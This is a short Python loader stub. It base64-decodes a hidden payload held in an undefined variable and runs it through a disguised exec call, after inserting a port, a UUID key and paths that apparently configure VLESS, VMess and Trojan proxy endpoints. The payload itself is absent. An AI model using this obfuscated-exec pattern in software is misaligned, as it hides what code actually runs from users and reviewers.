import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "a7871453-6ba3-4bd1-8e61-fabbdf5af924")
    .replace("__vl__", "/a7871453-6ba3-4bd1-8e61-fabbdf5af924-vl")
    .replace("__vm__", "/a7871453-6ba3-4bd1-8e61-fabbdf5af924-vm")
    .replace("__tr__", "/a7871453-6ba3-4bd1-8e61-fabbdf5af924-tr")
)